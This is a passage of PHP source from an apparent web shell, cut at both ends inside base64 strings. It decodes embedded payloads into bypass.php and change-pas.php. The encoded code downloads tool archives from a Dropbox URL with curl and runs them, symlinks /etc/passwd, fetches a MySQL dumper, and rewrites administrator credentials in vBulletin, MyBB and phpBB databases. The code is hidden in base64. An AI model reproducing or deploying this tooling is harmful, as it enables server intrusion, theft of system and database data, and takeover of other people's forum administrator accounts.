U1KTsKICAgZWNobyAiPGlmcmFtZSBzcmM9YWxsY29uZmlnL2NvbmZpZy5pem8gd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDE1J10pKQp7CiAgICBta2RpcignYnlwYXNzYmluJywgMDc1NSk7CiAgICBjaGRpcignYnlwYXNzYmluJyk7CgpAZXhlYygnY3VybCBodHRwOi8vZGwuZHJvcGJveC5jb20vdS83NDQyNTM5MS9ieXBhc3MudGFyLmd6IC1vIGJ5cGFzcy50YXIuZ3onKTsKQGV4ZWMoJ3RhciAteHZmIGJ5cGFzcy50YXIuZ3onKTsKQGV4ZWMoJ2NobW9kIDc1NSAuL2J5cGFzcy9sbicpOwpAZXhlYygnLi9ieXBhc3MvbG4gLXMgL2V0Yy9wYXNzd2QgMS5waHAnKTsKICAgZWNobyAiPGlmcmFtZSBzcmM9YnlwYXNzYmluLzEucGhwIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsKfQoKaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTYnXSkpCnsKQG1rZGlyKCJteXNxbGR1bXBlciIpOwpAY2hkaXIoIm15c3FsZHVtcGVyIik7CkBleGVjKCdjdXJsIGh0dHA6Ly9kbC5kcm9wYm94LmNvbS91Lzc0NDI1MzkxL215c3FsZHVtcGVyLnRhci5neiAtbyBteXNxbGR1bXBlci50YXIuZ3onKTsKQGV4ZWMoJ3RhciAteHZmIG15c3FsZHVtcGVyLnRhci5neicpOwoJZWNobyAiPGlmcmFtZSBzcmM9bXlzcWxkdW1wZXIvaW5kZXgucGhwIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsKfQo/PgoKICAgICAgICA8dGQgY2xhc3M9J3RkJyBzdHlsZT0nYm9yZGVyLWJvdHRvbS13aWR0aDp0aGluO2JvcmRlci10b3Atd2lkdGg6dGhpbic+PGZvcm0gbmFtZT0nRjEnIG1ldGhvZD0ncG9zdCc+CiAgICAgICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDE0JyB2YWx1ZT0nIENyZWF0IFB5dGhvbiAgJz4KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxMycgdmFsdWU9JyBDcmVhdCAgQ2dpICAgICc+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTEnIHZhbHVlPScxLlN5bSBBbGwgQ29uZmlnJz4KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQ3JyB2YWx1ZT0nMi5IdGFjY2VzcyBBbGwgQ29uZmlnJz4KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxNScgdmFsdWU9JyAvZXRjL3Bhc3N3ZCAgICc+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTYnIHZhbHVlPScgTXkgU1FMIER1bXBlciAnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEwJyB2YWx1ZT0ndGFyIC14dmYgU3ltLnRhcic+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTInIHZhbHVlPScxLlN5bSBMaW5rIFVzZXIgJz4KCQkJICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0OScgdmFsdWU9JzIuSHRhY2Nlc3MgTGlzdCAnPgoJCQkgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQ4JyB2YWx1ZT0nMy5IdGFjY2VzcyBFbXB0eSc+CgkJCSAgPC9mb3JtPgogICAgPC90ZD4KICAgCjwvYm9keT4KPC9odG1sPg==
';
    $file       = fopen("bypass.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=bypass.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'changepas') {
    $file       = fopen($dir . "change-pas.php", "w+");
    $perltoolss = 'PD9waHAKLy9CZWdpbmluZyBvZiBDb2RpbmcKZXJyb3JfcmVwb3J0aW5nKDApOwogICAgJGluZm8gPSAkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ107CiAgICAkc2l0ZSA9IGdldGVudigiSFRUUF9IT1NUIik7CiAgICAkcGFnZSA9ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddOwogICAgJHNuYW1lID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAkdW5hbWUgPSBwaHBfdW5hbWUoKTsKICAgICRzbW9kID0gaW5pX2dldCgnc2FmZV9tb2RlJyk7CiAgICAkZGlzZnVuYyA9IGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAkeW91cmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiAgICAkc2VydmVyaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTsKCQovL1RpdGxlCmVjaG8gIjxoZWFkPgo8c3R5bGU+CmJvZHkgeyBmb250LXNpemU6IDEycHg7CiAgICAgICAgICAgZm9udC1mYW1pbHk6IGFyaWFsLCBoZWx2ZXRpY2E7CiAgICAgICAgICAgIHNjcm9sbGJhci13aWR0aDogNTsKICAgICAgICAgICAgc2Nyb2xsYmFyLWhlaWdodDogNTsKICAgICAgICAgICAgc2Nyb2xsYmFyLWZhY2UtY29sb3I6IGJsYWNrOwogICAgICAgICAgICBzY3JvbGxiYXItc2hhZG93LWNvbG9yOiBzaWx2ZXI7CiAgICAgICAgICAgIHNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6IHNpbHZlcjsKICAgICAgICAgICAgc2Nyb2xsYmFyLTNkbGlnaHQtY29sb3I6c2lsdmVyOwogICAgICAgICAgICBzY3JvbGxiYXItZGFya3NoYWRvdy1jb2xvcjogc2lsdmVyOwogICAgICAgICAgICBzY3JvbGxiYXItdHJhY2stY29sb3I6IGJsYWNrOwogICAgICAgICAgICBzY3JvbGxiYXItYXJyb3ctY29sb3I6IHNpbHZlcjsKICAgIH0KPC9zdHlsZT4KPHRpdGxlPkt5bUxqbmsgLSBbJHNpdGVdPC90aXRsZT48L2hlYWQ+IjsKLy9CdXR0b24gTGlzdAplY2hvICI8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbicnPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXZidWxsZXRpbiB2YWx1ZT0ndkJ1bGxldGluJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1teWJiIHZhbHVlPSdNeUJCJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1waHBiYiB2YWx1ZT0ncGhwQkInPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXNtZiB2YWx1ZT0nU01GJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT13aG1jcyB2YWx1ZT0nV0hNQ1MnPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXdvcmRwcmVzcyB2YWx1ZT0nV29yZFByZXNzJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1qb29tbGEgdmFsdWU9J0pvb21sYSc+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9cGhwLW51a2UgdmFsdWU9J1BIUC1OVUtFJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT11cCB2YWx1ZT0nVHJhaWRudCBVUCc+PC9mb3JtPjwvY2VudGVyPiI7CmZ1bmN0aW9uIHVwZGF0ZSgpCnsKCWVjaG8gIlsrXSBVcGRhdGUgSGFzIERvbmUgXl9eIjsKfQovL3ZCdWxsZXRpbgppZiAoaXNzZXQoJF9QT1NUWyd2YnVsbGV0aW4nXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHZCdWxsZXRpbiBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluY3A8YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2luY2x1ZGVzL2NvbmZpZy5waHA8YnI+aW5jbHVkZXMvaW5pdC5waHAgPC9mb250Pgo8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyNGRjAwMDAnPj4+PC9mb250Pjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+IGluY2x1ZGVzL2NsYXNzX2NvcmUucGhwIDwvZm9udD4KPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjRkYwMDAwJz4+PjwvZm9udD48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPiBpbmNsdWRlcy9jb25maWcucGhwPC9mb250PjwvY2VudGVyPgogICAgPGNlbnRlcj48Zm9ybSBtZXRob2Q9UE9TVCBhY3Rpb249Jyc+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5NeXNxbCBIb3N0PC9mb250Pjxicj48aW5wdXQgdmFsdWU9bG9jYWxob3N0IHR5cGU9dGV4dCBuYW1lPWRiaHZiIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1mb3J1bXMgdHlwZT10ZXh0IG5hbWU9ZGJudmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1dmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwdmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VGFibGUgcHJlZml4PGJyPjwvZm9udD48aW5wdXQgdmFsdWU9dmJfIHR5cGU9dGV4dCBuYW1lPXBydmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9dGV4dCBuYW1lPXVydmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TmV3IHBhc3N3b3JkIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXBhc3N3b3JkIG5hbWU9cHN2YiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5OZXcgRS1tYWlsIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9eW91ci1lbWFpbEB4eHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbXZiIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjxicj4KICAgICAgICAgIDwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHZiID0gJF9QT1NUWydkYmh2YiddOwokZGJudmIgID0gJF9QT1NUWydkYm52YiddOwokZGJ1dmIgPSAkX1BPU1RbJ2RidXZiJ107CiRkYnB2YiAgPSAkX1BPU1RbJ2RicHZiJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh2YiwkZGJ1dmIsJGRicHZiKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJudmIpOwoKJHVydmI9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVydmIpOwoKJHNldF91cnZiID0gJF9QT1NUWyd1cnZiJ107CgokcHN2Yj1zdHJfcmVwbGFjZSgiXCciLCInIiwkcHN2Yik7CiRwYXNzX3ZiID0gJF9QT1NUWydwc3ZiJ107CgokZW12Yj1zdHJfcmVwbGFjZSgiXCciLCInIiwkZW12Yik7CiRzZXRfZW12YiA9ICRfUE9TVFsnZW12YiddOwoKJHZiX3ByZWZpeCA9ICRfUE9TVFsncHJ2YiddOwoKJHRhYmxlX25hbWUgPSAkdmJfcHJlZml4LiJ1c2VyIiA7CgokcXVlcnkgPSAnc2VsZWN0ICogZnJvbSAnIC4gJHRhYmxlX25hbWUgLiAnIHdoZXJlIHVzZXJuYW1lPSInIC4gJHNldF91cnZiIC4gJyI7JzsKCiRyZXN1bHQgPSBteXNxbF9xdWVyeSgkcXVlcnkpOwokcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCk7CiRzYWx0ID0gJHJvd1snc2FsdCddOwokcGFzczIgPSBtZDUoJHBhc3NfdmIpOwokcGFzcyA9JHBhc3MyIC4gJHNhbHQ7Cgokc2V0X3Bzc2FsdCA9IG1kNSgkcGFzcyk7CgokbGVjb25ndGhpZW4xID0gJ1VQREFURSAnIC4gJHRhYmxlX25hbWUgLiAnIFNFVCBwYXNzd29yZD0iJyAuICRzZXRfcHNzYWx0IC4gJyIgV0hFUkUgdXNlcm5hbWU9IicgLiAkc2V0X3VydmIgLiAnIjsnOwokbGVjb25ndGhpZW4yID0gJ1VQREFURSAnIC4gJHRhYmxlX25hbWUgLiAnIFNFVCBlbWFpbD0iJyAuICRzZXRfZW12YiAuICciIFdIRVJFIHVzZXJuYW1lPSInIC4gJHNldF91cnZiIC4gJyI7JzsKCiRvazE9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjEpOwokb2sxPUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4yKTsKCmlmKCRvazEpewplY2hvICI8c2NyaXB0PmFsZXJ0KCd2QnVsbGV0aW4gdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9NeUJCCmlmIChpc3NldCgkX1BPU1RbJ215YmInXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIE15QkIgSW5mbzxicj5QYXRjaCBDb250cm9sIFBhbmVsIDogW3BhdGNoXS9hZG1pbjxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vaW5jL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJobXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW15YmIgdHlwZT10ZXh0IG5hbWU9ZGJubXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1bXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwbXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVybXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIEUtbWFpbCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXlvdXItZW1haWxAeHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbW15IHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW15YmJfIHR5cGU9dGV4dCBuYW1lPXBybXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nQ2hhbmdlJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn1lbHNlewokZGJobXkgPSAkX1BPU1RbJ2RiaG15J107CiRkYm5teSAgPSAkX1BPU1RbJ2Ribm15J107CiRkYnVteSA9ICRfUE9TVFsnZGJ1bXknXTsKJGRicG15ICA9ICRfUE9TVFsnZGJwbXknXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaG15LCRkYnVteSwkZGJwbXkpOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5teSk7CgokdXJteT1zdHJfcmVwbGFjZSgiXCciLCInIiwkdXJteSk7CiRzZXRfdXJteSA9ICRfUE9TVFsndXJteSddOwoKJGVtbXk9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGVtbXkpOwokc2V0X2VtbXkgPSAkX1BPU1RbJ2VtbXknXTsKCiRteV9wcmVmaXggPSAkX1BPU1RbJ3BybXknXTsKCiR0YWJsZV9uYW1lMSA9ICRteV9wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4zID0gIlVQREFURSAkdGFibGVfbmFtZTEgU0VUIHVzZXJuYW1lID0nIi4kc2V0X3VybXkuIicgV0hFUkUgdWlkID0nMSciOwokbGVjb25ndGhpZW40ID0gIlVQREFURSAkdGFibGVfbmFtZTEgU0VUIGVtYWlsID0nIi4kc2V0X2VtbXkuIicgV0hFUkUgdWlkID0nMSciOwoKJG9rMj1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMyk7CiRvazI9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjQpOwoKaWYoJG9rMil7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ015QkIgdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9waHBCQgppZiAoaXNzZXQoJF9QT1NUWydwaHBiYiddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGhwQkIgSW5mbzxicj5QYXRjaCBDb250cm9sIFBhbmVsIDogW3BhdGNoXS9hZG08YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJocGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1waHBiYiB0eXBlPXRleHQgbmFtZT1kYm5waHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1cGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHBhc3N3b3JkPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9YWRtaW4gdHlwZT1wYXNzd29yZCBuYW1lPWRicHBocCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJwaHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHBhc3N3b3JkIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXBhc3N3b3JkIG5hbWU9cHNwaHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VGFibGUgcHJlZml4PGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cGhwYmJfIHR5cGU9dGV4dCBuYW1lPXBycGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHBocCA9ICRfUE9TVFsnZGJocGhwJ107CiRkYm5waHAgID0gJF9QT1NUWydkYm5waHAnXTsKJGRidXBocCA9ICRfUE9TVFsnZGJ1cGhwJ107CiRkYnBwaHAgID0gJF9QT1NUWydkYnBwaHAnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHBocCwkZGJ1